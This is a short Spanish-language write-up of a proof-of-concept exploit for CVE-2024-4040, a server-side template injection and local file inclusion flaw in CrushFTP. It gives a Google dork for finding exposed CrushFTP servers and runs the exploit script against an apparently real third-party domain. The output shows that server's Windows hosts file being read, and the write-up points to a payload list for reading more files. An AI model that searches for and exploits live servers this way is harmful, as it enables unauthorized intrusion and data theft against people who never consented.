# Crushed - CVE-2024-4040
___
Esta es una prueba de concepto para una vulnerabilidad de inyección de plantilla del lado del servidor (SSTI) e inclusión de archivos locales (LFI) en CrushFTP.

Descargamos el exploit desde el siguiente enlace:
- https://github.com/Stuub/CVE-2024-4040-SSTI-LFI-PoC

Buscamos servidores vulnerables utilizando *Google Dorking*.
```bash
intitle:"CrushFTP WebInterface" inurl:/WebInterface/login.html
```

Ejecutamos el exploit.
```bash
┌──(mr-r00t㉿mr-r00t)-[~/Exploits/CVE-2024-4040-SSTI-LFI-PoC]
└─$ python3 crushed.py -t https://html.documation.com/ --lfi "C:/windows/system32/drivers/etc/hosts"
```

Nos aparece un error al leer el archivo, ya que identificamos que es un sistema *Windows*.
```bash
[+] Installation directory of CrushFTP: C:/CrushFTP10/
[+] File to read: C:/windows/system32/drivers/etc/hosts
```

Para vulnerar el sistema, tendriamos que utlizar payloads de *Windows*, podemos utilizar el siguiente diccionario:

- https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-windows-list.txt

Al finalizar el exploit, nos muestra el output del script.
```bash
[+] Successfully extracted C:/windows/system32/drivers/etc/hosts
[+] Extracted response: 
<?xml version="1.0" encoding="UTF-8"?> 
<commandResult><response>You need download, upload permissions to zip a file:/a
You need upload permissions to zip a file:# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost


</response></commandResult>
```

___
